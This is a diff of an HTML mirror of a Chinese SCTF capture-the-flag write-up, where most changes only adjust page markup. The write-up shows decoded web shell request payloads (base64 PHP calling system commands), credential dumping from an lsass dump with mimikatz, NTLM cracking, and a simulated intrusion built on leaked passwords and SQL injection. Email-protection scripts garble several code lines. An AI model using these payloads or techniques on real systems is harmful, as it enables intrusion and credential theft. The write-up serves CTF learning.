@@ -3,14 +3,14 @@
 			<head>
 			     <title>SCTF-WriteUp - EvilMoon</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/4243">http://drops.wooyun.org/tips/4243</a></h1>
 				
       <p>
-        <h1>PT100</h1>
+        </p><h1>PT100</h1>
 
-<hr />
+<hr>
 
 <p>看到题面提示说 flag 在后台</p>
 
@@ -82,7 +82,7 @@
 
 <h1>PT200</h1>
 
-<hr />
+<hr>
 
 <p>看了下 source code 发现有个</p>
 
@@ -138,7 +138,7 @@ and 1=1
 
 <h1>PT400</h1>
 
-<hr />
+<hr>
 
 <p>官方给了个 wordpress 的 blog 看了下。没什么想法。</p>
 
@@ -227,18 +227,18 @@ return 0;
 
 <h1>PT500</h1>
 
-<hr />
+<hr>
 
 <p>链接到三叶草花卉公司。</p>
 
 <pre><code>http://corp.sycsec.com
 </code></pre>
 
-<p><img src="http://C:%5CUsers%5Ctrack%5CDocuments%5CTencent%20Files%5C2577406885%5CFileRecv%5Cwriteup" alt="enter image description here" /></p>
+<p><img src="../images_result/images/C:%5CUsers%5Ctrack%5CDocuments%5CTencent%20Files%5C2577406885%5CFileRecv%5Cwriteup" alt="enter image description here"></p>
 
 <p>可以看到给出了几个链接，还有个妹子的图片，在源码里还有妹子的邮箱。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513375512.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513375512.png" alt="enter image description here"></p>
 
 <p>从题面看，最终是要到 file 服务器找到那个种子。然后</p>
 
@@ -248,7 +248,7 @@ Request timeout for icmp_seq 0
 
 <p>发现 file 服务器在内网，好了就是渗透了。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513489390.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513489390.png" alt="enter image description here"></p>
 
 <p>然后先到 report 服务器，看到时要用工号登陆，又说妹子来了就有83人了。易得，妹子的工号肯定就是</p>
 
@@ -257,13 +257,13 @@ Request timeout for icmp_seq 0
 
 <p>然后到公开的社工库查询下，发现在 csdn 泄漏了妹子的密码。用那个密码成功登陆 report 服务器。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513458226.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513458226.png" alt="enter image description here"></p>
 
 <p>然后有上传点，发现上传任何文件都会变成 lol 的后缀的文件。然后看了下上传的包，随手在文件名里面加了个 ' 发现报错了。</p>
 
 <p>好了，目测就是文件名的注入了。注入得到每个人的账号密码，工号，公司邮箱。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513431804.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513431804.png" alt="enter image description here"></p>
 
 <p>噢，邮箱啊。那就是接下去要登陆 mail 服务器了。目测邮箱地址为</p>
 
@@ -272,16 +272,16 @@ Request timeout for icmp_seq 0
 
 <p>好了，然后密码一个个试过去，发现</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="98e0f1f9f7e0f1d8ebe1fbebfdfbb6fbf7f5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="98e0f1f9f7e0f1d8ebe1fbebfdfbb6fbf7f5">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
 </code></pre>
 
 <p>可以登陆，发现里面有 vpn 服务器地址，还说了密码是工号加生日，</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513420469.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513420469.png" alt="enter image description here"></p>
 
 <p>邮件里还说小美周末就生日了。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513567996.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513567996.png" alt="enter image description here"></p>
 
 <p>然后到</p>
 
@@ -291,7 +291,7 @@ Request timeout for icmp_seq 0
 
 <p>SYC079940927</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513598294.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513598294.png" alt="enter image description here"></p>
 
 <p>登陆 vpn 服务器后，访问</p>
 
@@ -306,13 +306,13 @@ Request timeout for icmp_seq 0
 <pre><code>http://10.24.13.37/files/SYC001 － SYC083/torrent
 </code></pre>
 
-<p><img src="http://static.wooyun.org/20141209/2014120906513558561.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120906513558561.png" alt="enter image description here"></p>
 
 <p>Get Flag!</p>
 
 <h1>code200</h1>
 
-<hr />
+<hr>
 
 <p>把数值转成二进制观察下就行了，直接贴代码吧。代码太挫，勿喷。</p>
 
@@ -404,13 +404,13 @@ if __name__ == '__main__':
 
 <h1>RE50</h1>
 
-<hr />
+<hr>
 
 <p>送分题，就是没来得及看公告……使用IDA64分析，发现是对输入的字符串每一个字符右移3位，然后和字符串Jr3gFud6n进行比较看是否一致。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265765016.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265765016.png" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265793374.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265793374.png" alt="enter image description here"></p>
 
 <p>Python脚本：</p>
 
@@ -430,11 +430,11 @@ if __name__ == "__main__":
 
 <h1>MISC100</h1>
 
-<hr />
+<hr>
 
 <p>对bin文件进行分析，发现在主框架中通过signal函数注册了几个信号，其中’2’,’4’,’6’,’8’分别用于控制下、左、上、右四个方向，SIGALRM用于处理游戏的主要业务逻辑。至于SIGTRAP，则是在handler里面留了个个int 3的断点，简单的反调试罢了，SIGTRAP的信号处理逻辑为直接执行一个空函数。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265776339.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265776339.png" alt="enter image description here"></p>
 
 <p>所以我们可以写一个程序，通过发送信号的方式来控制按键。Linux下C语言可以使用kill函数对指定的pid发送信号，而pid则可以通过执行命令得到（ps/grep/awk），为了完美接收键盘控制信息，我这里使用了curses来接收按键操作，这样直接按方向键就好了。</p>
 
@@ -491,23 +491,23 @@ int main(int argc, char** argv)
 
 <p>从编号为16的数据包中找到一个Encryption Key为1122334455667788，于是Google一下关键字“SMB 1122334455667788 密码”，点点点来到看雪的一个帖子http://bbs.pediy.com/showthread.php?t=176189，学习一下。</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265752248.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265752248.png" alt="enter image description here"></p>
 
 <p>以及Unicode Password，如下图所示：</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265721219.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265721219.png" alt="enter image description here"></p>
 
 <p>参照看雪论坛的帖子，新进行如下操作：</p>
 
 <p>Step 1: 彩虹表跑起来</p>
 
-<hr />
+<hr>
 
 <p>从ftp://freerainbowtables.mirror.garr.it/mirrors/freerainbowtables/RTI2/halflmchall/下载彩虹表，还好网速快，哗啦啦就把第一个文件夹的4GB多的彩虹表下好了。然后从http://sourceforge.net/projects/rcracki/下载rcracki程序，执行如下命令： rcracki_mt.exe -h 9e94258a03356914 D:\Downloads\rainbow</p>
 
 <p>很快就看到了结果，如图所示：</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265862283.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265862283.png" alt="enter image description here"></p>
 
 <p>第一步搞定，这里得到的结果为：</p>
 
@@ -515,7 +515,7 @@ int main(int argc, char** argv)
 
 <p>Step 2: Perl脚本跑起来</p>
 
-<hr />
+<hr>
 
 <p>这里卡了一会，因为看雪的帖子并没有说John文件是如何构造的，他那个是Metasploit自动生成的，所以我又翻了好几个帖子，最后构造了这样一个文件：</p>
 
@@ -523,7 +523,7 @@ int main(int argc, char** argv)
 
 <p>然后去Kali下的metasploit-framework下跑netntlm.pl脚本：</p>
 
-<p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="493e20273a26270922282520">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/usr/share/metasploit-framework/data/john/run.linux.x64.mmx$</p>
+<p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="493e20273a26270922282520">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/usr/share/metasploit-framework/data/john/run.linux.x64.mmx$</p>
 
 <p>sudo perl ./netntlm.pl --seed "NETLMIS" --file /tmp/john_netntlm</p>
 
@@ -531,39 +531,39 @@ int main(int argc, char** argv)
 
 <h1>MISC400A</h1>
 
-<hr />
+<hr>
 
 <p>Wireshark打开pcap文件，输入过滤器“tcp contains ".rar"”，发现一个编号为10192的POST数据包，参数经过Unescape解码后得到：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d6afb9eb96b3a0b7ba">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=C:\\inetpub\\wwwroot\\backup\\wwwroot.rar
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d6afb9eb96b3a0b7ba">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=C:\\inetpub\\wwwroot\\backup\\wwwroot.rar
 </code></pre>
 
 <p>其中z0参数经过Base64解码后得到：</p>
 
-<pre><code>@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-&gt;|");;$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="93b7f5e3aed3f5fce3f6fd">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>($F,"r");if(@fgetc($fp))<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b7ccf7d1d4dbd8c4d2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};echo("|&lt;-");die();
+<pre><code>@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-&gt;|");;$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="93b7f5e3aed3f5fce3f6fd">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>($F,"r");if(@fgetc($fp))<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b7ccf7d1d4dbd8c4d2">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};echo("|&lt;-");die();
 </code></pre>
 
 <p>可以知道这里是读取了wwwroot.rar这个压缩包文件，在Wireshark将Rar给Dump出来，解压发现需要密码。因为rar文件比较大，所以10192附近有很多TCP的数据包，所以我们使用过滤器“http”进行筛选之后再观察10192附近的数据包，发现了很多POST数据包。</p>
 
 <p>从10192开始，往上一个一个的看POST数据包，发现编号9997的数据包参数经过Unescape解码后得到：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ff6e0b2cfeaf9eee3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJkM6XHByb2dyYX4xXFdpblJBUlxyYXIgYSBDOlxJbmV0cHViXHd3d3Jvb3RcYmFja3VwXHd3d3Jvb3QucmFyIEM6XEluZXRwdWJcd3d3cm9vdFxiYWNrdXBcMS5naWYgLWhwSkpCb29tJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ff6e0b2cfeaf9eee3">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJkM6XHByb2dyYX4xXFdpblJBUlxyYXIgYSBDOlxJbmV0cHViXHd3d3Jvb3RcYmFja3VwXHd3d3Jvb3QucmFyIEM6XEluZXRwdWJcd3d3cm9vdFxiYWNrdXBcMS5naWYgLWhwSkpCb29tJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
 </code></pre>
 
 <p>对参数进行Base64解码得到：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="225b4d1f624754434e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>(base64_decode($_POST[z0]));&amp;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2a501a176a434443">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-&gt;|");;$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";$r="{$p} {$c}";@system($r." 2&gt;&amp;1",$ret);print ($ret!=0)?"
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="225b4d1f624754434e">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>(base64_decode($_POST[z0]));&amp;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2a501a176a434443">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-&gt;|");;$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";$r="{$p} {$c}";@system($r." 2&gt;&amp;1",$ret);print ($ret!=0)?"
 ret={$ret}
 ":"";;echo("|&lt;-");die();&amp;z1=cmd&amp;z2=cd /d "c:\inetpub\wwwroot\"&amp;C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E]
 </code></pre>
 
 <p>其中hp后面的JJBoom就是压缩包的密码了，解压得到一个1.gif文件，trid鉴定一下，发现是个Minidump文件：</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265843549.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265843549.png" alt="enter image description here"></p>
 
 <p>将后缀改成mdmp之后，使用Visual Studio打开看了下，发现是lsass.exe进程的Dump文件，如下图所示：</p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265843670.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265843670.png" alt="enter image description here"></p>
 
 <p>Google一下关键字“lsass dump 密码”，就看到了mimikatz，所以根据经验这就是通过mimikatz来读取密码了，打开mimikatz，然后输入如下命令：</p>
 
@@ -573,23 +573,23 @@ ret={$ret}
   <p>sekurlsa::logonPasswords</p>
 </blockquote>
 
-<p>就能看到分析出来的密码了，密码处显示<TAB><SPACE>，如下图所示：</p>
+<p>就能看到分析出来的密码了，密码处显示<tab><space>，如下图所示：</space></tab></p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265844095.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265844095.png" alt="enter image description here"></p>
 
 <p>于是提交了一下尝试：</p>
 
-<p>SCTF{<TAB><SPACE>} SCTF{ } （TAB+空格）</p>
+<p>SCTF{<tab><space>} SCTF{ } （TAB+空格）</space></tab></p>
 
-<p>发现都不对，然后又去反查NTLM发现查不到，最后自己在XP下测试了一下，发现密码中是不能有空格的，然后空格就是空格，也不会显示成<SPACE>，当然在命令行下也看不出来有空格，所以只能猜测<TAB><SPACE>后面是有空格了，试了几个发现也不对，就把输出重定向到文件里：</p>
+<p>发现都不对，然后又去反查NTLM发现查不到，最后自己在XP下测试了一下，发现密码中是不能有空格的，然后空格就是空格，也不会显示成<space>，当然在命令行下也看不出来有空格，所以只能猜测<tab><space>后面是有空格了，试了几个发现也不对，就把输出重定向到文件里：</space></tab></space></p>
 
-<p><img src="http://static.wooyun.org/20141209/2014120904265943622.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014120904265943622.png" alt="enter image description here"></p>
 
-<p>打开文件就能看到密码了，所以Flag为SCTF{<TAB><SPACE> }。</p>
+<p>打开文件就能看到密码了，所以Flag为SCTF{<tab><space> }。</space></tab></p>
 
 <h1>CODE400</h1>
 
-<hr />
+<hr>
 
 <p>题目所给的原始代码如下：</p>
 
@@ -760,40 +760,40 @@ if __name__ == "__main__":
 
 <h1>pwn200</h1>
 
-<hr />
